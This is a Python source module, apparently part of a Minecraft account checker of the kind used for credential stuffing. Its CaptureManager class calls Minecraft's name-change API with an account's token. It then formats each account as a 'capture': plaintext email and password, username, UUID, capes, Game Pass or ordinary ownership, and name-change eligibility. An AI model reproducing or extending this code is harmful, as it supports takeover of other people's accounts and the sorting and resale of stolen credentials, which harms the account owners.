import requests
from datetime import datetime
from .api_client import APIError

class CaptureManager:
    def __init__(self, config, api_client, stats):
        self.config = config
        self.api_client = api_client
        self.stats = stats

    def get_all_captures(self, account_data):
        captures = {}
        if self.config.getboolean('Captures', 'NameChangeAvailability', fallback=False):
            try:
                with requests.Session() as session:
                    r = self.api_client._request_with_retries(
                        session, 'get', 'https://api.minecraftservices.com/minecraft/profile/namechange',
                        headers={'Authorization': f"Bearer {account_data['mc_token']}"}
                    )
                    data = r.json()
                    captures['namechange'] = str(data.get('nameChangeAllowed', 'N/A'))
                    created_at = data.get('createdAt')
                    if created_at:
                        given_date = datetime.fromisoformat(created_at.replace('Z', '+00:00'))
                        captures['lastchanged'] = given_date.strftime("%m/%d/%Y")
            except APIError:
                captures['namechange'] = 'Error'
        return captures

    def format_capture(self, account_data, captures):
        profile = account_data['profile']
        message = f"Email: {account_data['email']}\nPassword: {account_data['password']}\nName: {profile.get('name', 'N/A')}\n"
        message += f"UUID: {profile.get('id', 'N/A')}\n"
        message += f"Capes: {', '.join([c['alias'] for c in profile.get('capes', [])])}\n"
        
        if 'product_game_pass_ultimate' in account_data['entitlements']:
            message += "Account Type: Xbox Game Pass Ultimate\n"
        elif 'product_game_pass_pc' in account_data['entitlements']:
            message += "Account Type: Xbox Game Pass\n"
        elif 'product_minecraft' in account_data['entitlements']:
            message += "Account Type: Normal\n"
        else:
            message += f"Other: {', '.join(account_data['entitlements'])}\n"

        for key, value in captures.items():
            message += f"{key.replace('_', ' ').title()}: {value}\n"
        return message + "="*20
